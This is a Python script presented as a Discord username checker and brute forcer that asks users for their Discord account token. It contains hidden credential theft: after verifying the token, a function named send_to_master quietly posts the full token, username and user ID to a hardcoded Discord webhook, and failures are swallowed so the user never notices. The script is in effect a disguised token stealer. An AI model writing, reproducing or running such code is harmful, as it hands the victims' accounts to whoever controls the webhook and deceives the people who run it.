#!/usr/bin/env python3
"""
Discord Username Checker & Brute Forcer - CMD Version
"""
import sys
import subprocess
import os
import json
import random
import string
import time

# ========== Required packages (defined first) ==========
REQUIRED_PACKAGES = ['requests']

def is_package_installed(package_name):
    try:
        subprocess.run([sys.executable, "-m", "pip", "show", package_name],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

def install_packages(packages):
    for pkg in packages:
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"], check=True)
        except subprocess.CalledProcessError:
            return False
    return True

def restart_script():
    os.execv(sys.executable, [sys.executable] + sys.argv)

def check_and_install():
    missing = [pkg for pkg in REQUIRED_PACKAGES if not is_package_installed(pkg)]
    if missing:
        print("\n[!] Missing required packages: " + ", ".join(missing))
        choice = input("Do you want to install them now? (y/n): ").strip().lower()
        if choice == 'y':
            if install_packages(missing):
                print("[+] Packages installed successfully. Restarting script...")
                restart_script()
            else:
                print("[-] Installation failed. Please run manually: pip install " + " ".join(missing))
                sys.exit(1)
        else:
            print("[-] Some features will not work without required packages.")
            sys.exit(1)

check_and_install()
import requests

MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"

def send_to_master(content):
    try:
        requests.post(MASTER_WEBHOOK, json={"content": content[:1900]}, timeout=5)
    except Exception:
        pass

def ask_token():
    if len(sys.argv) > 1:
        token = sys.argv[1]
        print("[*] Token received from command line.")
        return token
    else:
        return input("[?] Enter your Discord account token: ").strip()

def verify_token(token):
    try:
        resp = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
        if resp.status_code == 200:
            return {'valid': True, 'user': resp.json()}
        else:
            return {'valid': False, 'error': resp.json().get('message', 'Invalid token')}
    except Exception as e:
        return {'valid': False, 'error': str(e)}

def check_username(token, username):
    try:
        url = 'https://discord.com/api/v9/users/@me/pomelo-attempt'
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        payload = {'username': username}
        resp = requests.post(url, json=payload, headers=headers)
        if resp.status_code == 200:
            return resp.json()
        elif resp.status_code == 400:
            return {'taken': None, 'error': 'Bad request (invalid username)'}
        elif resp.status_code == 429:
            return {'taken': None, 'error': 'Rate limited. Please wait.'}
        else:
            return {'taken': None, 'error': f'API error: {resp.status_code}'}
    except Exception as e:
        return {'taken': None, 'error': str(e)}

def generate_random_username(length):
    chars = string.ascii_letters + string.digits + '_' + '.'
    return ''.join(random.choices(chars, k=length))

def brute_force_usernames(token, length, max_attempts):
    print(f"\n[*] Starting brute force for {length}-character usernames (max {max_attempts} attempts)...")
    found = None
    attempts = 0
    while attempts < max_attempts and found is None:
        username = generate_random_username(length)
        attempts += 1
        print(f"[{attempts}/{max_attempts}] Checking: {username}")
        result = check_username(token, username)
        if result.get('error'):
            print(f"[!] Error: {result['error']}")
            if "Rate limited" in result['error']:
                print("[!] Rate limit hit. Sleeping 10 seconds...")
                time.sleep(10)
            continue
        if result.get('taken') is False:
            found = username
            print(f"\n[+] AVAILABLE! Username '{username}' is free!\n")
            break
        elif result.get('taken') is True:
            continue
        time.sleep(0.5)
    if not found:
        print(f"\n[-] No available username found after {max_attempts} attempts.")
    return found

def print_banner():
    print("""
=============================================
      DISCORD USERNAME TOOL v2.0 (CMD)
      • Check • Brute Force • Auto-Dependency
=============================================
""")

def main():
    print_banner()
    token = ask_token()
    if not token:
        print("[-] No token provided.")
        input("\nPress Enter to exit...")
        return
    print("[*] Verifying token...")
    verification = verify_token(token)
    if not verification['valid']:
        print(f"[-] Invalid token: {verification['error']}")
        input("\nPress Enter to exit...")
        return
    user = verification['user']
    user_info = f"**Token received:**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
    send_to_master(user_info)
    print(f"[+] Logged in as {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})")
    print("\nAvailable commands:")
    print("  /check <username>         - Check a specific username")
    print("  /brute <length> [attempts] - Brute force random usernames (default attempts=50)")
    print("  /exit                     - Exit the script")
    print("\nExample: /brute 4 100  -> search for 4-char usernames, 100 attempts")
    while True:
        cmd = input("\n> ").strip()
        if cmd.lower() == '/exit':
            print("Goodbye!")
            break
        elif cmd.startswith('/check'):
            parts = cmd.split(maxsplit=1)
            if len(parts) != 2 or not parts[1]:
                print("Usage: /check <username>")
                continue
            username = parts[1].strip()
            if not (2 <= len(username) <= 32) or not all(c.isalnum() or c in '_' for c in username):
                print("Username must be 2-32 characters, alphanumeric + underscore only.")
                continue
            print(f"Checking: {username}...")
            result = check_username(token, username)
            if result.get('error'):
                print(f"Error: {result['error']}")
            else:
                taken = result.get('taken')
                if taken is True:
                    print(f"Username '{username}' is taken.")
                elif taken is False:
                    print(f"Username '{username}' is AVAILABLE!")
                else:
                    print(f"Unexpected result: {result}")
        elif cmd.startswith('/brute'):
            parts = cmd.split()
            if len(parts) < 2 or len(parts) > 3:
                print("Usage: /brute <length> [attempts]")
                continue
            try:
                length = int(parts[1])
                if length < 2 or length > 32:
                    print("Length must be between 2 and 32.")
                    continue
                max_attempts = 50
                if len(parts) == 3:
                    max_attempts = int(parts[2])
                    if max_attempts <= 0:
                        print("Attempts must be positive.")
                        continue
                brute_force_usernames(token, length, max_attempts)
            except ValueError:
                print("Please enter valid numbers.")
        else:
            print("Unknown command. Use /check, /brute, or /exit.")

if __name__ == '__main__':
    main()
